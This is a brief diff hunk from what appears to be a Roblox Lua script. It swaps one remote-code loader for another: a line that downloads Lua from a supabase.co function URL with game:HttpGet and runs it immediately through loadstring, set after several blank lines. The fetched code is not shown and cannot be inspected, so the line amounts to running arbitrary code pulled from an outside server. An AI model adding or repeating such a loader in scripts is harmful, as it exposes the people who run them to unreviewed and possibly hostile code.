@@ -35,6 +35,5 @@
 
 
 
-loadstring(game:HttpGet("https://qxifszbmmnedgvcjfjer.supabase.co/functions/v1/l/jEn9meA"))()
-
+loadstring(game:HttpGet("https://qxifszbmmnedgvcjfjer.supabase.co/functions/v1/l/tsnjcX6"))()
 
